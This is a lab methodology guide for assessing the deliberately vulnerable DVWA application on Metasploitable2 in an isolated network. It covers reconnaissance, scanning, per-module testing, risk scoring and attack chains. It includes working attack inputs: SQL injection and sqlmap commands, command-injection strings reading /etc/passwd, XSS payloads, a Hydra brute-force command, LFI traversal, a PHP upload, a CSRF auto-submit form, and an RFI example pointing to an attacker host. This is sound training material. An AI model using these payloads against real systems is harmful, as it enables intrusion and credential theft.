# DVWA Vulnerability Assessment Methodology

**Purpose:** Web application vulnerability identification and risk assessment  
**Scope:** No exploitation (except PoC for validation), pure assessment and documentation  
**Approach:** Systematic, repeatable, portfolio-ready  
**Target:** DVWA (Damn Vulnerable Web Application) — accessed via Metasploitable2

---

## About DVWA

DVWA (Damn Vulnerable Web Application) is a deliberately insecure PHP/MySQL web application designed for security professionals to practice web application vulnerability assessment in a legal, controlled environment.

**Why DVWA matters for your methodology:**
- Mirrors real-world web vulnerabilities found in production applications
- Covers the majority of the OWASP Top 10 (2021)
- Provides difficulty levels (Low, Medium, High, Impossible) allowing progressive skill development
- Legal and safe environment for hands-on practice
- Pre-installed on Metasploitable2 — no additional download required

**OWASP Top 10 Coverage in DVWA:**

| DVWA Module | OWASP Category |
|---|---|
| SQL Injection | A03: Injection |
| Blind SQL Injection | A03: Injection |
| Command Injection | A03: Injection |
| XSS (Reflected) | A03: Injection |
| XSS (Stored) | A03: Injection |
| XSS (DOM) | A03: Injection |
| CSRF | A01: Broken Access Control |
| File Inclusion (LFI/RFI) | A05: Security Misconfiguration |
| File Upload | A05: Security Misconfiguration |
| Brute Force | A07: Identification & Authentication Failures |
| Weak Session IDs | A07: Identification & Authentication Failures |
| Insecure CAPTCHA | A07: Identification & Authentication Failures |

**Security Levels:**
- **Low** — No security controls, baseline identification
- **Medium** — Partial controls, requires more analysis
- **High** — Near real-world hardening
- **Impossible** — Secure reference implementation (used for comparison)

---

## Learning Objectives

By completing this assessment, you will be able to:

1. Identify and document web application vulnerabilities systematically
2. Map findings to the OWASP Top 10 framework
3. Perform web reconnaissance and enumeration using industry tools
4. Assess risk using CVSS scoring
5. Produce a professional vulnerability assessment report
6. Distinguish between false positives and confirmed findings
7. Understand attack chains specific to web applications

---

## Methodology Overview

```
Phase 1: Pre-Engagement    → Setup, verify isolation, configure DVWA
Phase 2: Reconnaissance    → Discover target, fingerprint web stack
Phase 3: Scanning          → Automated vulnerability scanning
Phase 4: Enumeration       → Manual deep-dive into each DVWA module
Phase 5: Analysis          → Risk scoring and prioritization
Phase 6: Validation        → Verify findings, eliminate false positives
Phase 7: Reporting         → Document everything professionally
```

---

## Phase 1: Pre-Engagement 📋

**Goal:** Access DVWA via Metasploitable2, configure tools, and verify isolated lab environment

---

### 1.1 Accessing DVWA

DVWA comes pre-installed on Metasploitable2. After completing your Metasploitable2 setup and confirming network isolation, access DVWA directly in your browser:

```bash
# Set target variable (Metasploitable2 IP)
export DVWA_TARGET=<METASPLOITABLE2_IP>

# Access DVWA in browser
firefox http://$DVWA_TARGET/dvwa &

# Direct login URL
# http://<METASPLOITABLE2_IP>/dvwa/login.php
```

> **Note:** No additional VM download required. DVWA runs as part of the Metasploitable2 web stack alongside other web applications (Mutillidae, phpMyAdmin, etc.).

---

### 1.2 Network Isolation Verification

```bash
# Variables (set once, use throughout assessment)
export DVWA_TARGET=<METASPLOITABLE2_IP>

# Verify isolation - internet should FAIL
ping -c 4 8.8.8.8
# Expected: 100% packet loss

# Verify reachability - target should SUCCEED
ping -c 4 $DVWA_TARGET
# Expected: replies received

# Confirm DVWA web interface is up
curl -I http://$DVWA_TARGET/dvwa
# Expected: HTTP 200 or 302 redirect to login page
```

---

### 1.3 DVWA Initial Configuration

```bash
# Open DVWA setup page in browser
firefox http://$DVWA_TARGET/dvwa/setup.php &

# On the setup page:
# 1. Click "Create / Reset Database"
# 2. Wait for confirmation message
# 3. Login with default credentials:
#    Username: admin
#    Password: password

# Set security level to LOW for initial assessment
# Navigate to: DVWA Security → Security Level → Low → Submit
```

**Document default credentials:**

| Field | Value |
|---|---|
| URL | http://<METASPLOITABLE2_IP>/dvwa/login.php |
| Username | admin |
| Password | password |
| Security Level | Low (initial assessment) |
| Database | MySQL (dvwa) |

---

### 1.4 Burp Suite Setup

Burp Suite is used during enumeration to intercept, inspect, and manipulate HTTP requests — confirming injection points, analyzing session tokens, and testing authentication controls.

**Launch Burp Suite:**

```bash
# Burp Suite comes pre-installed on Kali Linux
burpsuite &

# Or from the Applications menu:
# Applications → Web Application Analysis → burpsuite
```

**Configure Burp Proxy:**

```bash
# Default Burp proxy listener
# Host: 127.0.0.1
# Port: 8080

# Verify listener is active:
# Burp Suite → Proxy → Options → Proxy Listeners
# Confirm: 127.0.0.1:8080 is Running
```

**Configure Firefox to use Burp Proxy:**

```bash
# Firefox → Settings → Network Settings → Manual Proxy Configuration
# HTTP Proxy: 127.0.0.1   Port: 8080
# Check: "Also use this proxy for HTTPS"
# Click OK

# Alternative - use FoxyProxy extension (recommended for easy toggle):
# Install FoxyProxy Standard from Firefox Add-ons
# Add proxy: 127.0.0.1:8080
# Toggle on when needed, off when done
```

**Install Burp CA Certificate (to intercept HTTPS):**

```bash
# With Burp running and Firefox proxy configured:
# Navigate to: http://burpsuite
# Click "CA Certificate" → Download
# Firefox → Settings → Privacy & Security → Certificates
# → View Certificates → Import → Select downloaded cert
# Check: "Trust this CA to identify websites"
```

**Verify Burp is intercepting:**

```bash
# In Burp: Proxy → Intercept → Intercept is ON
# In Firefox: Navigate to http://$DVWA_TARGET/dvwa/login.php
# Expected: Request appears in Burp Intercept tab
# Click "Forward" to pass request through
# Turn Intercept OFF for passive monitoring (HTTP History)
```

**Key Burp features used in this assessment:**

| Feature | Used For |
|---|---|
| Proxy → HTTP History | Review all requests passively |
| Proxy → Intercept | Capture and modify requests in real time |
| Repeater | Replay and tweak requests manually |
| Intruder | Automated parameter fuzzing (brute force) |
| Decoder | Encode/decode Base64, URL, HTML values |

---

### 1.5 Baseline Documentation

```bash
# Screenshot the following:
# - DVWA login page (http://$DVWA_TARGET/dvwa/login.php)
# - DVWA setup confirmation (database created)
# - Security level set to Low
# - Network isolation test (failed ping to 8.8.8.8)
# - Successful ping to Metasploitable2
# - Burp Suite proxy listener running
# - Firefox proxy configured
```

---

### Deliverables:

```
01-pre-engagement/
├── evidence/
│   ├── 03-dvwa-login-page.png
│   ├── 05-dvwa-setup-confirmation.png
│   ├── 04-dvwa-security-level-low.png
│   ├── 01-isolation-test.png
│   ├── 02-reachability-test.png
│   ├── 06-burpsuite-proxy-listener.png
│   └── 07-firefox-proxy-config.png
│   └── 08-Intercept-confirmation.png
└── pre-engagement-notes.md
```

---

## Phase 2: Reconnaissance 🔍

**Goal:** Discover target, fingerprint the web stack, and identify entry points

---

### 2.1 Host Discovery

```bash
# Identify DVWA IP if not known
nmap -sn 192.168.x.0/24

# Confirm host is alive
nmap -sn $DVWA_TARGET

# Save results
nmap -sn $DVWA_TARGET -oA 02-reconnaissance/host-discovery/host-discovery
```

---

### 2.2 Web Technology Fingerprinting

```bash
# Identify web technologies
whatweb http://$DVWA_TARGET | tee 02-reconnaissance/whatweb/whatweb-output.txt

# HTTP headers analysis
curl -I http://$DVWA_TARGET | tee 02-reconnaissance/headers/http-headers.txt

# Full curl verbose
curl -v http://$DVWA_TARGET 2>&1 | tee 02-reconnaissance/headers/curl-verbose.txt

# Wappalyzer (browser extension - manual)
# Open Firefox → Navigate to DVWA → Check Wappalyzer extension output
# Screenshot and save findings
```

**Document what to look for:**
- Web server type and version (Apache, Nginx)
- PHP version
- MySQL version
- Operating system hints
- Framework/CMS identifiers
- Cookies and session management indicators

---

### 2.3 Initial Port Scan

```bash
# Quick port scan - identify web ports
nmap -T4 $DVWA_TARGET | tee 02-reconnaissance/nmap/initial-scan.txt

# Save in all formats
nmap -T4 $DVWA_TARGET -oA 02-reconnaissance/nmap/initial-scan
```

---

### Deliverables:

```
02-reconnaissance/
├── host-discovery/
│   ├── host-discovery.nmap
│   ├── host-discovery.xml
│   └── host-discovery.gnmap
├── whatweb/
│   └── whatweb-output.txt
├── headers/
│   ├── http-headers.txt
│   └── curl-verbose.txt
├── nmap/
│   └── initial-scan.(nmap|xml|gnmap)
└── evidence/
    ├── whatweb-screenshot.png
    └── browser-fingerprint.png
```

---

## Phase 3: Scanning 🎯

**Goal:** Comprehensive automated vulnerability identification

---

### 3.1 Nmap Scanning (Progressive Depth)

```bash
# Step 1: Initial port scan
nmap -sS -T4 $DVWA_TARGET -oA 03-scanning/nmap/01-initial-port-scan

# Step 2: Service version detection
nmap -sV -sC -T4 $DVWA_TARGET -oA 03-scanning/nmap/02-service-version-detection

# Step 3: Full port scan
nmap -sS -sV -sC -O -p- -T4 $DVWA_TARGET -oA 03-scanning/nmap/03-full-scan

# Step 4: Web-specific NSE scripts
nmap --script http-enum,http-headers,http-methods,http-auth-finder \
  -p 80,443,8080 $DVWA_TARGET \
  -oA 03-scanning/nmap/04-web-nse

# Step 5: Vulnerability scripts
nmap --script vuln -p 80,443 $DVWA_TARGET -oA 03-scanning/nmap/05-nse-vuln
```

---

### 3.2 Nikto Web Vulnerability Scan

```bash
# Check Nikto version
nikto -Version | tee 03-scanning/nikto/configs/nikto-version.txt

# Full Nikto scan on port 80
nikto -h http://$DVWA_TARGET -o 03-scanning/nikto/results/dvwa/nikto-http-scan.txt

# Nikto with authentication (scan authenticated pages)
nikto -h http://$DVWA_TARGET \
  -id admin:password \
  -o 03-scanning/nikto/results/dvwa/nikto-authenticated-scan.txt

# If HTTPS is available
nikto -h https://$DVWA_TARGET -o 03-scanning/nikto/results/dvwa/nikto-ssl-scan.txt
```

**What Nikto looks for in DVWA context:**
- Default credentials
- Outdated software versions
- Dangerous HTTP methods (PUT, DELETE)
- Missing security headers
- Exposed configuration files
- Directory indexing
- phpinfo() exposure

---

### 3.3 Directory and File Enumeration

```bash
# Dirb - directory enumeration
dirb http://$DVWA_TARGET \
  /usr/share/wordlists/dirb/common.txt \
  -o 03-scanning/dirb/dirb-results.txt

# Gobuster - faster alternative
gobuster dir \
  -u http://$DVWA_TARGET \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -o 03-scanning/gobuster/gobuster-results.txt

# Scan for specific file extensions
gobuster dir \
  -u http://$DVWA_TARGET \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,bak,old,conf,config,xml,yml,zip \
  -o 03-scanning/gobuster/gobuster-extensions.txt

# Config and backup files
dirb http://$DVWA_TARGET \
  /usr/share/wordlists/dirb/common.txt \
  -X .bak,.old,.zip,.tar.gz,.conf \
  -o 03-scanning/dirb/dirb-backup-files.txt
```

---

### 3.4 OWASP ZAP Scan (Optional - GUI)

```bash
# Launch ZAP
owasp-zap &

# Steps (GUI):
# 1. File → New Session
# 2. Automated Scan → Enter URL: http://$DVWA_TARGET
# 3. Attack → Run Active Scan
# 4. Export report: Report → Generate HTML Report
# Save to: 03-scanning/zap/results/dvwa/zap-report.html

# ZAP CLI alternative
zap-cli quick-scan \
  --self-contained \
  --start-options "-config api.disablekey=true" \
  http://$DVWA_TARGET \
  -o 03-scanning/zap/results/dvwa/zap-cli-results.txt
```

---

### 3.5 SSL/TLS Assessment (If HTTPS Available)

```bash
# SSLScan
sslscan $DVWA_TARGET | tee 03-scanning/ssl/sslscan-results.txt

# Testssl.sh
testssl.sh $DVWA_TARGET | tee 03-scanning/ssl/testssl-results.txt

# Nmap SSL scripts
nmap --script ssl-enum-ciphers -p 443 $DVWA_TARGET \
  -oA 03-scanning/ssl/nmap-ssl-ciphers
```

---

### Deliverables:

```
03-scanning/
├── nmap/
│   ├── 01-initial-port-scan.(nmap|xml|gnmap)
│   ├── 02-service-version-detection.*
│   ├── 03-full-scan.*
│   ├── 04-web-nse.*
│   └── 05-nse-vuln.*
├── nikto/
│   ├── configs/nikto-version.txt
│   └── results/dvwa/
│       ├── nikto-http-scan.txt
│       └── nikto-authenticated-scan.txt
├── dirb/
│   ├── dirb-results.txt
│   └── dirb-backup-files.txt
├── gobuster/
│   ├── gobuster-results.txt
│   └── gobuster-extensions.txt
├── zap/
│   └── results/dvwa/zap-report.html
└── ssl/ (if applicable)
    ├── sslscan-results.txt
    └── testssl-results.txt
```

---

## Phase 4: Enumeration 🔎

**Goal:** Manual deep-dive into each DVWA vulnerability module

> **Assessment Approach:** We assess each module at **Low** security level first, document findings, then note how the vulnerability changes at Medium and High. Impossible level is used as the secure reference.

---

### 4.1 Authentication Assessment

```bash
# Directory: 04-enumeration/authentication/

# Test default credentials
curl -c cookies.txt -d "username=admin&password=password&Login=Login" \
  http://$DVWA_TARGET/login.php -v \
  | tee 04-enumeration/authentication/login-test.txt

# Check session cookie attributes
curl -I http://$DVWA_TARGET/login.php | grep -i "set-cookie" \
  | tee 04-enumeration/authentication/session-cookies.txt

# Check for HttpOnly and Secure flags
# Document: missing flags = vulnerability
```

**Document:**
- Default credentials accepted (Yes/No)
- Session cookie flags (HttpOnly, Secure, SameSite)
- Session ID length and randomness
- Login page security (HTTPS enforced?)
- Account lockout policy (Yes/No)

---

### 4.2 Brute Force Module

```bash
# Directory: 04-enumeration/brute-force/
```

**Step 1: Intercept Login Request with Burp Suite**

```bash
# 1. Enable Burp Intercept: Proxy → Intercept → ON
# 2. Navigate to: http://$DVWA_TARGET/dvwa/vulnerabilities/brute/
# 3. Enter any username/password and click Login
# 4. Burp captures the request — note the exact parameter names and cookie

# Example captured request:
# GET /dvwa/vulnerabilities/brute/?username=admin&password=test&Login=Login HTTP/1.1
# Cookie: PHPSESSID=<session_id>; security=low

# Save screenshot of intercepted request
# Forward request and turn Intercept OFF
```

**Step 2: Check for Account Lockout (Manual)**

```bash
# Attempt login 10 times with wrong password manually
# Document: does the account lock? Is there a delay? Any error change?
# Screenshot login response after multiple failed attempts
```

**Step 3: Hydra Brute Force (PoC)**

```bash
# Get session cookie first (from Burp HTTP History or browser Dev Tools)
# Application → Cookies → PHPSESSID value

# Hydra brute force - limited wordlist for PoC
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  $DVWA_TARGET http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=<your_session_id>; security=low" \
  -V -t 4 -f \
  | tee 04-enumeration/brute-force/hydra-results.txt

# Flags explained:
# -l admin       → single username to test
# -P rockyou.txt → password wordlist
# -V             → verbose (show each attempt)
# -t 4           → 4 threads (keep low to avoid detection in real assessments)
# -f             → stop after first valid credential found
# F=             → failure string (what appears on failed login)
# H=Cookie:      → pass session cookie with each request

# For a smaller PoC wordlist (faster):
hydra -l admin -P /usr/share/wordlists/metasploit/unix_passwords.txt \
  $DVWA_TARGET http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=<your_session_id>; security=low" \
  -V -t 4 -f \
  | tee 04-enumeration/brute-force/hydra-short-results.txt
```

**Step 4: Burp Intruder (Alternative to Hydra)**

```bash
# In Burp Suite:
# 1. From HTTP History, right-click the login request → Send to Intruder
# 2. Intruder → Positions tab
# 3. Clear all → Highlight password value → Add §
#    GET /dvwa/vulnerabilities/brute/?username=admin&password=§test§&Login=Login
# 4. Payloads tab → Payload type: Simple list
# 5. Load wordlist: /usr/share/wordlists/metasploit/unix_passwords.txt
# 6. Start Attack
# 7. Sort by Length — different length = successful login
# Screenshot Intruder results showing the successful password
```

**Document:**
- No account lockout policy confirmed
- No rate limiting observed
- No CAPTCHA protection at Low security
- Valid credentials found via Hydra/Intruder
- Screenshot: successful credential discovery

---

### 4.3 SQL Injection Module

```bash
# Directory: 04-enumeration/sqli/
```

**Step 1: Intercept Request with Burp Suite**

```bash
# 1. Enable Burp Intercept: Proxy → Intercept → ON
# 2. Navigate to: http://$DVWA_TARGET/dvwa/vulnerabilities/sqli/
# 3. Enter: 1 in the User ID field → Submit
# 4. Burp captures the GET request — note the id parameter
# GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
# Cookie: PHPSESSID=<session_id>; security=low

# Right-click request → Send to Repeater
# Turn Intercept OFF
```

**Step 2: Manual SQLi Testing via Burp Repeater**

```bash
# In Burp Repeater:
# Modify id parameter with payloads and click Send, observe response

# Payload 1 - detect injection point:
# id=1'
# Expected: MySQL error message (confirms injection)

# Payload 2 - confirm with OR clause:
# id=1' OR '1'='1
# Expected: All users returned

# Payload 3 - UNION-based enumeration:
# id=1' UNION SELECT null,null-- -
# Adjust columns until no error, then extract data:
# id=1' UNION SELECT user(),database()-- -

# Screenshot each response in Repeater
```

**Step 3: Sqlmap Automated Assessment (PoC)**

```bash
# Basic SQLi detection
sqlmap -u "http://$DVWA_TARGET/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<your_session_id>;security=low" \
  --dbs \
  --batch \
  | tee 04-enumeration/sqli/sqlmap-results.txt

# Enumerate tables (PoC)
sqlmap -u "http://$DVWA_TARGET/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<your_session_id>;security=low" \
  -D dvwa --tables \
  --batch \
  | tee 04-enumeration/sqli/sqlmap-tables.txt

# Get session ID from Burp HTTP History or browser Dev Tools
# Application → Storage → Cookies → PHPSESSID
```

**Document:**
- Injection point identified (GET/POST parameter)
- Error-based SQLi confirmed
- Database type and version
- Databases accessible
- Data exposure risk

---

### 4.4 Blind SQL Injection Module

```bash
# Directory: 04-enumeration/sqli-blind/

# Manual boolean-based test
# Input: 1' AND '1'='1   → should return result
# Input: 1' AND '1'='2   → should return empty

# Sqlmap blind SQLi
sqlmap -u "http://$DVWA_TARGET/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<your_session_id>;security=low" \
  --technique=B \
  --dbs \
  --batch \
  | tee 04-enumeration/sqli-blind/sqlmap-blind-results.txt
```

**Document:**
- Boolean-based blind SQLi confirmed
- Time-based blind SQLi confirmed (if applicable)
- Data inference possible without direct output

---

### 4.5 Command Injection Module

```bash
# Directory: 04-enumeration/command-injection/

# Manual test - in browser input field
# Input: 127.0.0.1 && whoami
# Input: 127.0.0.1; cat /etc/passwd
# Input: 127.0.0.1 | id

# Curl-based test
curl "http://$DVWA_TARGET/vulnerabilities/exec/" \
  --cookie "PHPSESSID=<your_session_id>;security=low" \
  --data "ip=127.0.0.1%26%26whoami&Submit=Submit" \
  | tee 04-enumeration/command-injection/cmd-injection-test.txt
```

**Document:**
- Command injection confirmed
- Commands executed (whoami, id, uname)
- OS and user context identified
- Potential for remote code execution

---

### 4.6 Cross-Site Scripting (XSS)

#### 4.6.1 Reflected XSS

```bash
# Directory: 04-enumeration/xss/reflected/

# Step 1: Intercept with Burp
# 1. Enable Burp Intercept → ON
# 2. Navigate to: http://$DVWA_TARGET/dvwa/vulnerabilities/xss_r/
# 3. Enter any name → Submit
# 4. Burp captures: GET /dvwa/vulnerabilities/xss_r/?name=test
# 5. Send to Repeater → Turn Intercept OFF

# Step 2: Test in Burp Repeater
# Modify name parameter with XSS payloads:
# name=<script>alert('XSS')</script>
# name=<img src=x onerror=alert('XSS')>
# Observe raw HTML response — confirm payload reflected unencoded

# Step 3: Browser confirmation (screenshot evidence)
# Navigate to:
firefox "http://$DVWA_TARGET/dvwa/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>" &
# Expected: Alert box fires → screenshot for evidence

# Curl-based test
curl "http://$DVWA_TARGET/dvwa/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>" \
  --cookie "PHPSESSID=<your_session_id>;security=low" \
  | grep -i "script" \
  | tee 04-enumeration/xss/reflected/reflected-xss-test.txt
```

#### 4.6.2 Stored XSS

```bash
# Directory: 04-enumeration/xss/stored/

# Post malicious payload to guestbook
curl -X POST "http://$DVWA_TARGET/vulnerabilities/xss_s/" \
  --cookie "PHPSESSID=<your_session_id>;security=low" \
  --data "txtName=Attacker&mtxMessage=<script>alert('Stored XSS')</script>&btnSign=Sign+Guestbook" \
  | tee 04-enumeration/xss/stored/stored-xss-test.txt

# Verify persistence - load page and check if payload executes
curl "http://$DVWA_TARGET/vulnerabilities/xss_s/" \
  --cookie "PHPSESSID=<your_session_id>;security=low" \
  | grep -i "script" \
  | tee 04-enumeration/xss/stored/stored-xss-verification.txt
```

#### 4.6.3 DOM XSS

```bash
# Directory: 04-enumeration/xss/dom/

# Manual browser test
# Navigate to: http://$DVWA_TARGET/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>
# Observe if alert fires
# Screenshot result
```

**Document for all XSS types:**
- Payload accepted and reflected/stored
- No input sanitization
- No output encoding
- Potential for session hijacking, credential theft

---

### 4.7 CSRF Module

```bash
# Directory: 04-enumeration/csrf/

# Manual test - analyze the password change form
# Navigate to: http://$DVWA_TARGET/vulnerabilities/csrf/
# Inspect form: Dev Tools → Network → Check for CSRF token in request
# If no CSRF token present → vulnerable

# Create a PoC HTML file (document only, don't weaponize)
cat > 04-enumeration/csrf/csrf-poc-structure.md << 'EOF'
# CSRF PoC Structure (Documentation Only)

A malicious page could contain:
<form action="http://DVWA_TARGET/vulnerabilities/csrf/" method="GET">
  <input type="hidden" name="password_new" value="hacked">
  <input type="hidden" name="password_conf" value="hacked">
  <input type="hidden" name="Change" value="Change">
</form>
<script>document.forms[0].submit();</script>

If a logged-in admin visits this page, their password would be changed without consent.
EOF
```

**Document:**
- No CSRF token in password change form
- Form submits via GET (exposes in browser history and logs)
- Any authenticated user's password can be changed by a malicious page

---

### 4.8 File Inclusion Module

```bash
# Directory: 04-enumeration/file-inclusion/

# Local File Inclusion (LFI) test
curl "http://$DVWA_TARGET/vulnerabilities/fi/?page=../../../../etc/passwd" \
  --cookie "PHPSESSID=<your_session_id>;security=low" \
  | tee 04-enumeration/file-inclusion/lfi-etc-passwd.txt

# Other LFI targets
curl "http://$DVWA_TARGET/vulnerabilities/fi/?page=../../../../etc/hosts" \
  --cookie "PHPSESSID=<your_session_id>;security=low" \
  | tee 04-enumeration/file-inclusion/lfi-etc-hosts.txt

# Remote File Inclusion (RFI) test - note: requires allow_url_include=On in PHP
# Document only - do not host malicious file
# Structure: ?page=http://attacker.com/shell.php
```

**Document:**
- LFI confirmed - /etc/passwd accessible
- System files readable without authentication
- RFI potential (based on PHP config)
- Path traversal confirmed

---

### 4.9 File Upload Module

```bash
# Directory: 04-enumeration/file-upload/

# Test 1: Upload a normal image (baseline)
curl -X POST "http://$DVWA_TARGET/vulnerabilities/upload/" \
  --cookie "PHPSESSID=<your_session_id>;security=low" \
  -F "uploaded=@/path/to/test.jpg;type=image/jpeg" \
  -F "Upload=Upload" \
  | tee 04-enumeration/file-upload/normal-upload-test.txt

# Test 2: Upload PHP file (PoC)
echo "<?php echo 'Upload vulnerability confirmed - ' . phpversion(); ?>" > /tmp/test-upload.php

curl -X POST "http://$DVWA_TARGET/vulnerabilities/upload/" \
  --cookie "PHPSESSID=<your_session_id>;security=low" \
  -F "uploaded=@/tmp/test-upload.php;type=image/jpeg" \
  -F "Upload=Upload" \
  | tee 04-enumeration/file-upload/php-upload-test.txt

# If upload succeeds, verify file is accessible (PoC only - confirm, don't exploit)
curl "http://$DVWA_TARGET/hackable/uploads/test-upload.php" \
  | tee 04-enumeration/file-upload/upload-verification.txt
```

**Document:**
- No file type validation on server side
- PHP files accepted
- Uploaded files accessible via URL
- Remote code execution possible via uploaded shell

---

### 4.10 Insecure CAPTCHA Module

```bash
# Directory: 04-enumeration/insecure-captcha/

# Manual inspection:
# Navigate to: http://$DVWA_TARGET/vulnerabilities/captcha/
# Inspect page source for CAPTCHA implementation
# Check if CAPTCHA is validated server-side

# Curl test - submit form without CAPTCHA solution
curl -X POST "http://$DVWA_TARGET/vulnerabilities/captcha/" \
  --cookie "PHPSESSID=<your_session_id>;security=low" \
  --data "step=1&password_new=test&password_conf=test&Change=Change" \
  | tee 04-enumeration/insecure-captcha/captcha-bypass-test.txt
```

**Document:**
- CAPTCHA validation not enforced server-side
- Password change possible without solving CAPTCHA
- Bypass method documented

---

### 4.11 Weak Session IDs Module

```bash
# Directory: 04-enumeration/weak-session-ids/

# Collect multiple session IDs to analyze pattern
for i in {1..5}; do
  curl -c /tmp/session_$i.txt -d "username=admin&password=password&Login=Login" \
    http://$DVWA_TARGET/login.php -s -o /dev/null
  grep PHPSESSID /tmp/session_$i.txt | awk '{print $7}'
done | tee 04-enumeration/weak-session-ids/session-id-samples.txt

# Navigate to weak session module and generate IDs
curl "http://$DVWA_TARGET/vulnerabilities/weak_id/" \
  --cookie "PHPSESSID=<your_session_id>;security=low" \
  -v 2>&1 | grep -i "dvwaSession" \
  | tee 04-enumeration/weak-session-ids/dvwa-session-ids.txt
```

**Document:**
- Session ID generation algorithm (sequential, timestamp-based, etc.)
- Predictability assessment
- Potential for session hijacking

---

### 4.12 JavaScript Module

```bash
# Directory: 04-enumeration/javascript/

# Manual inspection:
# Navigate to: http://$DVWA_TARGET/vulnerabilities/javascript/
# View page source (Ctrl+U)
# Inspect JavaScript for client-side validation only
# Check if validation is enforced server-side

# Extract JavaScript files
curl "http://$DVWA_TARGET/vulnerabilities/javascript/" \
  --cookie "PHPSESSID=<your_session_id>;security=low" \
  | grep -oP 'src="[^"]*.js"' \
  | tee 04-enumeration/javascript/js-files-found.txt
```

**Document:**
- Client-side only validation confirmed
- Security controls bypassable via browser dev tools or curl
- No server-side enforcement

---

### 4.13 Information Disclosure Checks

```bash
# Directory: 04-enumeration/information-disclosure/

# phpinfo exposure
curl http://$DVWA_TARGET/phpinfo.php \
  | tee 04-enumeration/information-disclosure/phpinfo.txt

# Server status
curl http://$DVWA_TARGET/server-status \
  | tee 04-enumeration/information-disclosure/server-status.txt

# Git exposure
curl -I http://$DVWA_TARGET/.git/ \
  | tee 04-enumeration/information-disclosure/git-exposure.txt

# Backup files
for ext in bak old zip tar.gz sql; do
  curl -I http://$DVWA_TARGET/config.$ext 2>/dev/null | grep "200 OK" && \
  echo "FOUND: config.$ext" >> 04-enumeration/information-disclosure/backup-files.txt
done

# Error page information
curl "http://$DVWA_TARGET/vulnerabilities/sqli/?id='" \
  --cookie "PHPSESSID=<your_session_id>;security=low" \
  | tee 04-enumeration/information-disclosure/sql-error-disclosure.txt
```

**Document:**
- phpinfo() exposed (reveals PHP version, config, paths)
- SQL error messages reveal database structure
- Version information in HTTP headers
- Any backup or config files accessible

---

### 4.14 HTTP Header Security Assessment

```bash
# Directory: 04-enumeration/http-headers/

# Full header analysis
curl -I http://$DVWA_TARGET | tee 04-enumeration/http-headers/response-headers.txt

# Check for missing security headers
echo "=== Security Header Assessment ===" > 04-enumeration/http-headers/security-headers-analysis.txt
curl -I http://$DVWA_TARGET 2>/dev/null | tee -a 04-enumeration/http-headers/security-headers-analysis.txt

# What to look for (missing = vulnerability):
# - X-Frame-Options
# - X-Content-Type-Options
# - Content-Security-Policy (CSP)
# - Strict-Transport-Security (HSTS)
# - X-XSS-Protection
# - Referrer-Policy
```

**Document for each missing header:**
- Header name
- Risk (e.g., missing X-Frame-Options = Clickjacking risk)
- Recommendation

---

### Complete Enumeration Structure:

```
04-enumeration/
├── authentication/
├── brute-force/
├── sqli/
├── sqli-blind/
├── command-injection/
├── xss/
│   ├── reflected/
│   ├── stored/
│   └── dom/
├── csrf/
├── file-inclusion/
├── file-upload/
├── insecure-captcha/
├── weak-session-ids/
├── javascript/
├── information-disclosure/
└── http-headers/
```

---

## Phase 5: Analysis & Risk Scoring 📊

**Goal:** Organize findings and prioritize by risk

---

### 5.1 Create Master Vulnerability List

```
Consolidate ALL findings into one spreadsheet:

Columns:
- Vuln ID (WV-001, WV-002, etc.)
- CVE (if applicable)
- DVWA Module
- OWASP Category
- Severity (Critical/High/Medium/Low)
- CVSS Score
- Description
- Affected URL/Parameter
- Exploitability (High/Medium/Low)
- Impact (Critical/High/Medium/Low)
- Remediation
- Status (Open/Validated/False Positive)
```

---

### 5.2 Risk Scoring Formula

```
Risk Score = Severity × Exploitability × Business Impact

Severity:
- Critical = 4
- High     = 3
- Medium   = 2
- Low      = 1

Exploitability:
- Public exploit/tool exists = 3
- Manual exploitation possible = 2
- Theoretical only = 1

Business Impact:
- Full system/data compromise = 3
- Partial access/data leak = 2
- Information disclosure = 1
```

---

### 5.3 DVWA Vulnerability Risk Matrix

| Vuln ID | Module | OWASP | Severity | CVSS | Risk Score |
|---|---|---|---|---|---|
| WV-001 | SQL Injection | A03 | Critical | 9.8 | 36 |
| WV-002 | Command Injection | A03 | Critical | 9.8 | 36 |
| WV-003 | File Upload | A05 | Critical | 9.8 | 36 |
| WV-004 | File Inclusion (LFI) | A05 | High | 8.8 | 27 |
| WV-005 | Stored XSS | A03 | High | 8.8 | 27 |
| WV-006 | Reflected XSS | A03 | High | 7.4 | 18 |
| WV-007 | CSRF | A01 | High | 8.8 | 27 |
| WV-008 | Brute Force | A07 | High | 7.5 | 18 |
| WV-009 | Weak Session IDs | A07 | Medium | 6.5 | 12 |
| WV-010 | DOM XSS | A03 | Medium | 6.1 | 12 |
| WV-011 | Insecure CAPTCHA | A07 | Medium | 5.3 | 8 |
| WV-012 | Missing Security Headers | A05 | Low | 4.3 | 4 |
| WV-013 | Information Disclosure | A05 | Low | 3.7 | 3 |

---

### 5.4 Attack Chain Analysis

```
# Attack Chain 1: SQL Injection → Database Compromise
1. Entry: SQL Injection (WV-001) - /vulnerabilities/sqli/
   - No input sanitization
   - Exploitability: HIGH (sqlmap available)

2. Lateral: Database enumeration
   - Extract all databases
   - Read user table (usernames + hashed passwords)
   - Impact: CRITICAL

3. Escalation: Credential reuse
   - Hash cracking (MD5 hashes in DVWA)
   - Login to admin panel
   - Full application control

Overall Risk: CRITICAL (Score: 36/36)

---

# Attack Chain 2: File Upload → Remote Code Execution
1. Entry: File Upload (WV-003) - /vulnerabilities/upload/
   - No file type validation
   - Exploitability: HIGH

2. Execution: PHP file upload
   - Upload PHP script as image
   - File stored in /hackable/uploads/

3. Access: Web shell execution
   - Navigate to uploaded file URL
   - Execute OS commands via PHP

Overall Risk: CRITICAL (Score: 36/36)

